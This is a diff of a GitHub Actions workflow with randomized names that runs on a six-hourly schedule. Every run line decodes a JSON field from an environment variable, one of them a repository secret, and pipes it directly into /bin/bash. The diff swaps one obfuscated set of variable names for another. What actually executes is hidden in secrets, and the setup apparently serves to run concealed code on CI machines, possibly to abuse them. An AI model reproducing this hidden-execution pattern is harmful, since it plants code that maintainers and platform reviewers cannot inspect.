@@ -1,8 +1,9 @@
 name: liyuezi7163
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 0/6 * * *'
+    - cron: '42 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,19 +12,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: liyuezi7163
         env:
-          pmsm3: ${{ secrets.pmsm3 }}
+          jgu6: ${{ secrets.jgu6 }}
         run: |
-          echo $pmsm3 | jq -r .tyu38 | /bin/bash
-          echo $nbydk82 | jq -r .vl13 | /bin/bash
-          echo $ddhge212 | jq -r .y89825 | /bin/bash
-          echo $ce9 | jq -r .xrd117 | /bin/bash
-          echo $hrsx22232 | jq -r .nov46572 | /bin/bash
-          echo $g51285 | jq -r .lds0143 | /bin/bash
-          echo $m55 | jq -r .k15 | /bin/bash
-          echo $z180 | jq -r .ocv7065 | /bin/bash
-          echo $jpq09 | jq -r .em053 | /bin/bash
-          echo $asrp72 | jq -r .bcmr45 | /bin/bash
-          echo $cwaw1 | jq -r .jw53097 | /bin/bash
-          echo $hcv312 | jq -r .d7 | /bin/bash
-          echo $cw168 | jq -r .yejc25 | /bin/bash
+          echo $jgu6 | jq -r .vai332 | /bin/bash
+          echo $ftuo994 | jq -r .kanmm72 | /bin/bash
+          echo $nqang37328 | jq -r .uq8819 | /bin/bash
+          echo $kf8 | jq -r .hqoa50385 | /bin/bash
+          echo $xrs3054 | jq -r .plz5 | /bin/bash
 
